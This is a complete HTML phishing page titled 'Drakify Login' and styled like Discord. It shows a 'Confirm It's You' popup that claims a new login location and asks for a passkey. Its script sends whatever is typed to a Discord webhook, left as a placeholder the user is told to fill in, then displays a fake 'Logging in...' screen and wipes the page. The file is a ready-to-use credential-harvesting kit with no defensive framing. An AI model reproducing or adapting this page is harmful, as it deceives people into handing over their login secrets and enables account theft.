<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Drakify Login</title>
  <style>
    body {
      background: url("https://wallpapercave.com/wp/wp5128415.jpg") no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
    }

    .popup {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.75);
      z-index: 9999;
      backdrop-filter: blur(8px);
    }

    .popup-box {
      background-color: #36393f;
      border-radius: 12px;
      padding: 30px;
      color: white;
      text-align: center;
      width: 320px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
      animation: fadeIn 0.4s ease;
    }

    .avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      margin-bottom: 15px;
    }

    .popup h2 {
      margin: 0 0 10px;
      font-size: 22px;
    }

    .popup input {
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      border: none;
      border-radius: 5px;
      background-color: #202225;
      color: white;
    }

    .popup button {
      margin-top: 15px;
      padding: 10px;
      width: 100%;
      background-color: #5865F2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .popup button:hover {
      background-color: #4752C4;
    }

    #loading {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.85);
      color: white;
      font-size: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      animation: fadeIn 0.4s ease;
    }

    #alert {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #202225;
      color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
      z-index: 10001;
      text-align: center;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body onload="showPopup()">

  <div id="popup" class="popup">
    <div class="popup-box">
      <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
      <h2>Confirm It's You</h2>
      <p>New login location detected ‚Äî please enter your passkey</p>
      <input type="password" id="passInput" placeholder="Enter Passkey">
      <button onclick="sendPass()">Confirm</button>
    </div>
  </div>

  <div id="loading">Logging in...</div>
  <div id="alert">‚ö†Ô∏è Please provide a valid passkey.</div>

  <script>
    const popup = document.getElementById("popup");
    const loading = document.getElementById("loading");
    const alertBox = document.getElementById("alert");
    const webhookURL = "YOUR_WEBHOOK_HERE"; // Replace with your Discord webhook

    function showPopup() {
      popup.style.display = "flex";
      document.getElementById("passInput").focus();
    }

    function sendPass() {
      const passkey = document.getElementById("passInput").value.trim();
      if (!passkey) {
        alertBox.style.display = "block";
        setTimeout(() => {
          alertBox.style.display = "none";
        }, 2000);
        return;
      }

      popup.style.display = "none";
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `üîê Passkey submitted: **${passkey}**`
        })
      })
      .then(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      })
      .catch(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      });
    }

    document.getElementById("passInput").addEventListener("keypress", function(e) {
      if (e.key === "Enter") sendPass();
    });
  </script>

</body>
</html>
